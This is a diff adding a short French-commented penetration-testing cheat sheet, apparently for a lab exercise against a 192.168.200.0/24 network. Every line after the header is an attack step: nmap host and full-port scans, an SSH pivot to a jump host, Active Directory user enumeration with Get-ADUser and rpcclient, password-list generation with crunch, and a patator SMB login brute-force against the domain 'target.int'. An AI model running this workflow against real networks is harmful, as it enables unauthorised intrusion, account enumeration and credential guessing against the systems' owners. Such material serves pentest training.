@@ -1,0 +1,29 @@
+# Découverte des ip
+nmap -sn 192.168.200.0/24
+# Scan des ports ouverts pour les machines découvertes
+nmap -p- -T4 192.168.200.X
+
+# 2 en 1
+nmap -sS -p- -T4 192.168.200.0/24
+
+# connection machine de rebond
+ssh user@192.168.200.X -p
+
+# get AD list
+Get-ADUser -Filter * | Select-Object SamAccountName
+
+Get-ADUser -Filter * | Select-Object SamAccountName > C:\users_list.txt
+
+# depuis linux 
+rpcclient -U 'DOMAIN\user' 192.168.200.X -c "enumdomusers" > users_list.txt
+
+# generer mot de pass > 
+XP84r%1Y
+P@ssw0rd
+
+crunch 8 8 U21=a3L/ -o passwords.txt
+
+# lancer patator
+patator smb_login host=192.168.200.X d=target.int user=users_list.txt password=passwords.txt -x ignore:mesg='STATUS_LOGON_FAILURE' --rate-limit=1 -v
+
+
